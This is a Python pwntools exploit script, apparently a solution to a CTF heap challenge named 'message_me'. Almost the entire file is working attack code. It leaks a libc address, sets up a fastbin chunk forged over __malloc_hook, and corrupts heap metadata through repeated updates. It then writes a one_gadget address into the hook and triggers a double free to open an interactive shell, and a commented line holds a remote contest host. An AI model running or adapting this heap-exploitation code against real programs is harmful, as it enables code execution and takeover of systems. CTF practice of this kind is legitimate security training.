#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
context.arch="amd64"
pwn_file="./message_me"
#os.environ["LD_LIBRARY_PATH"]="./"

elf=ELF(pwn_file)
libc=elf.libc

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("127.0.0.1",8888)
    #conn=remote("159.65.125.233",6003)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address 0x%x"%libc.address)
    pause()

def add(size,c):
    conn.sendlineafter("choice : ","0")
    conn.sendlineafter("Give me the message size : ",str(size))
    conn.sendafter("Give me your meesage : ",c)

def show(idx):
    conn.sendlineafter("choice : ","2")
    conn.sendlineafter("Give me index of the message :",str(idx))
    print conn.recvuntil("Message : ")
    return conn.recvline(keepends=False)

def dele(idx):
    conn.sendlineafter("choice : ","1")
    conn.sendlineafter("Give me index of the message :",str(idx))

def update(idx):
    conn.sendlineafter("choice : ","3")
    conn.sendlineafter("Give me index of the message : ",str(idx))

add(0xf00,"a")#0
add(0xf00,"a")#1
add(0xf00,"a")#2

add(0x100,"a")#3
add(0x20,"a")#4
dele(3)
add(0x20,"a")#5
libc.address=u64(show(5).ljust(8,"\x00"))-0x3c4c61
add(0x60,"a")#6
add(0x60,"a")#7
f={
    0xf:0x71,
    0x17:libc.symbols["__malloc_hook"]-0x23,
}
add(0x100,fit(f,filler="\x00"))#8
dele(6)
dele(7)
debug()
for i in range(0x54):
    update(7)

add(0x60,"a")
add(0x60,"a")
add(0x60,"a"*11+p64(libc.address+0xf02a4))
dele(1)
dele(1)
conn.interactive()
